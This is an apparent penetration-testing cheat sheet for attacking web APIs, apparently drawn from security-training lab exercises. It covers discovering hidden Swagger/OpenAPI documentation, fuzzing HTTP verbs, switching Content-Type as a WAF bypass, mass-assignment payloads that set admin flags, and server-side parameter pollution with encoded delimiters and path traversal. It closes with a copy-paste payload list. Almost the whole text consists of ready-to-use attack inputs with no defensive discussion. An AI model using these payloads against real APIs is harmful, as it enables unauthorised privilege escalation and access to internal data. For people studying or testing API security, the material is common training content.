============================================================
1. API DOCUMENTATION DISCOVERY (RECON)
============================================================

Common documentation paths (Fuzzing):
* /api
* /swagger
* /swagger/index.html
* /swagger/v1
* /openapi.json
* /api/openapi.json
* /api/v1/openapi.json
* /api/swagger/v1

Base path reduction technique (If deep endpoint found):
* Target: /api/swagger/v1/users/123
* Test 1: /api/swagger/v1
* Test 2: /api/swagger
* Test 3: /api

============================================================
2. ENDPOINT & METHOD FUZZING (VERBS)
============================================================

HTTP Methods cycle on target endpoint:
* GET /api/tasks      (Read list)
* POST /api/tasks     (Create item)
* PUT /api/tasks/1    (Replace item)
* PATCH /api/tasks/1  (Partial update)
* DELETE /api/tasks/1 (Remove item)
* OPTIONS /api/tasks  (Query allowed methods)

Content-Type switching (WAF bypass / Error trigger):
* Original: Content-Type: application/json
* Test 1:   Content-Type: application/xml
* Test 2:   Content-Type: text/xml
* Test 3:   Content-Type: application/x-www-form-urlencoded

============================================================
3. MASS ASSIGNMENT (AUTO-BINDING DETECTION)
============================================================

Step 1: Compare GET response structural fields with PUT/PATCH body.

GET /api/users/123 response:
{
    "id": 123,
    "username": "wiener",
    "email": "wiener@example.com",
    "isAdmin": false
}

Step 2: Bind test using invalid data type (Check for internal processing).
PATCH /api/users/123
{
    "username": "wiener",
    "email": "wiener@example.com",
    "isAdmin": "invalid_type_string"
}
(Look for: 400 Bad Request / Type conversion errors)

Step 3: Privilege escalation payload injection.
PATCH /api/users/123
{
    "username": "wiener",
    "email": "wiener@example.com",
    "isAdmin": true
}

============================================================
4. SERVER-SIDE PARAMETER POLLUTION (SSPP)
============================================================

4.1) QUERY STRING INJECTION

Delimiter injection (Append extra arguments via URL encoding):
* %26 -> &
* %3D -> =

Payload examples:
* URL:    /userSearch?name=peter%26public=true
  Result: /internal/api/users?name=peter&public=true
* URL:    /userSearch?name=peter%26foo=xyz
  Result: /internal/api/users?name=peter&foo=xyz

Parameter overriding (Duplicate keys context):
* URL:    /userSearch?name=peter%26name=administrator
  Result: /internal/api/users?name=peter&name=administrator
  (Check if backend processes 1st or 2nd instance)

⸻

4.2) REST PATH POLLUTION & TRUNCATION

Truncation sequences (Drop backend appended path):
* %23 -> #
* %3F -> ?

Payload examples:
* URL:    /api/users/peter%23
  Result: /internal/private/users/peter# /ignored_backend_string
* URL:    /api/users/peter%3F
  Result: /internal/private/users/peter?ignored_backend_string

Path Traversal via parameters:
* URL:    /api/users/../administrator
  Result: /internal/api/users/peter/../../administrator -> /internal/api/administrator

============================================================
5. QUICK API PAYLOADS LIST (COPY PASTE)
============================================================

Hidden documentation paths:
/api/swagger/v1
/api/swagger
/swagger/index.html
/openapi.json

Content-Type replacements:
Content-Type: application/xml
Content-Type: application/x-www-form-urlencoded
Content-Type: text/plain

Mass assignment fields:
"isAdmin": true
"role": "admin"
"role": 1
"is_admin": true

Query pollution:
%26public=true
%26role=admin
%26status=active
%26name=administrator

Path manipulation:
%23
%3F
../
../../
%2e%2e%2f

============================================================
